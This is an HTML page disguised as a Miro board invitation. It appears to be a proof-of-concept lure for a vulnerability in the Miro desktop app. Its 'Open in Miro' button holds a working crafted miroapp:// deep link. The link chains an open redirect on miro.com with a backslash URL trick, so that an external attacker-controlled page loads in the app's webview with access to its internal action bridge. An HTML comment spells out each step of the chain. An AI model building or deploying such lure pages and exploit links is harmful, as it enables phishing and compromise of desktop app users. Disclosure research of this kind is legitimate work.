<!DOCTYPE html>
<html>
<head>
<title>Miro Board Invitation</title>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
.card { background: #fff; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 40px; max-width: 480px; text-align: center; }
.logo { width: 48px; height: 48px; margin-bottom: 16px; }
h1 { font-size: 22px; color: #050038; margin: 0 0 8px; }
p { color: #666; font-size: 14px; line-height: 1.6; }
.btn { display: inline-block; background: #4262ff; color: #fff; text-decoration: none; padding: 14px 32px; border-radius: 8px; font-size: 16px; font-weight: 600; margin-top: 20px; transition: background 0.2s; }
.btn:hover { background: #2b47d9; }
.note { font-size: 12px; color: #999; margin-top: 16px; }
</style>
</head>
<body>
<div class="card">
    <svg class="logo" viewBox="0 0 48 48" fill="none"><rect width="48" height="48" rx="10" fill="#FFD02F"/><path d="M12 34V14l8 10 4-10 4 10 8-10v20" stroke="#050038" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
    <h1>You've been invited to a Miro board</h1>
    <p>Bruno shared <strong>"Q4 Strategy Planning"</strong> with you.<br>Click below to open it in the Miro desktop app.</p>

    <!--
        EXPLOIT CHAIN:
        1. miroapp:// deep link → Electron second-instance handler
        2. externalAppUrl= → client-side redirect to miro.com (passes isKnownServer)
        3. lp-build-api/stop-preview?redirect= → server 307 redirect
        4. /\example.com → Chromium treats \ as / → //example.com → attacker domain
        5. Attacker page loads in webview with _rtb_app_actions_ bridge
    -->
    <a class="btn" id="deeplink" href="miroapp://miro.com/app/board/uXjVEU4f-pU=/?externalAppUrl=https://miro.com/miro-site-lp-build-api/stop-preview/?redirect=/\eib98.github.io/miro-poc/video.html">
        Open in Miro
    </a>

    <p class="note">Requires Miro desktop app to be running.</p>
</div>

<script>
// Auto-trigger after 2 seconds if user doesn't click
// (most browsers block auto-navigation to custom protocols without gesture,
//  but some allow it from an iframe or with user interaction priming)
</script>
</body>
</html>
